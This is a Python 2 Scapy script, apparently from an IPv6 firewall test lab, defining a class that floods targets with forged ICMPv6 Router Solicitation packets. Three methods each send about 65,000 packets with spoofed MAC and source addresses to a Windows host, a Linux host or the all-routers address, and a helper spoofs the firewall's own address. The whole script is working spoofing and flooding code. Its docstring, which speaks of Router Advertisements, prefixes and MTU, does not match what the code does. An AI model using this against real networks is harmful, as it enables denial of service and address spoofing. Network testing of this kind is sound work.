#!/usr/bin/python

from scapy.all import *


"""
This class test change/addition of prefix and MTU value with Router Advertisement.
"""         
class RS:
    
    def __init__(self):
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.firewall = "2001:abcd:acad:2::1"
        self.firewallMac = "08:00:27:b1:da:41"
        self.linkFirewall = "fe80::1"
        self.prefix = "2001:abcd:acad:2:"
        self.allRouter = "ff02::2"
        print 'Router Solicitation'

    
    def buildPacketInternal(self, mac, src, dst):
        return IPv6(dst=dst,src=src)/ICMPv6ND_RS()/ICMPv6NDOptSrcLLAddr(lladdr=mac)

    def buildPacketRemote(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_RS()/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)


    
    def execModuleInternalWin(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex24 = '{:04x}'.format(t)
            mac = "08:00:27:" + "00" + ":" + hex24[:2] + ":" + hex24[2:4]
            globalUni = self.prefix + ":" + hex24[:2] + ":" + hex24[2:4]
            packetContainer = self.buildPacketInternal(mac, globalUni, self.win)
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalLinux(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex24 = '{:04x}'.format(t)
            mac = "08:00:27:" + "00" + ":" + hex24[:2] + ":" + hex24[2:4]
            globalUni = self.prefix + ":" + hex24[:2] + ":" + hex24[2:4]
            packetContainer = self.buildPacketInternal(mac, globalUni, self.linux)
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalFirewall(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex24 = '{:04x}'.format(t)
            mac = "08:00:27:" + "00" + ":" + hex24[:2] + ":" + hex24[2:4]
            globalUni = self.prefix + ":" + hex24[:2] + ":" + hex24[2:4]
            packetContainer = self.buildPacketInternal(mac, globalUni, self.allRouter)
            send(packetContainer, iface=exitIface, verbose=False)
